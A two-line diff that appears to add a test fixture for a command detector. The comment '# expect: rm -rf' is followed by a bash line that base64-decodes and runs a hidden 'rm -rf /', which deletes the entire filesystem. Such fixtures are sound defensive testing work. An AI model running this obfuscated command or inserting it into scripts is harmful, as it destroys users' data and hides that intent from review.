@@ -1,0 +1,2 @@
+# expect: rm -rf
+bash -c "$(echo cm0gLXJmIC8= | base64 -d)"
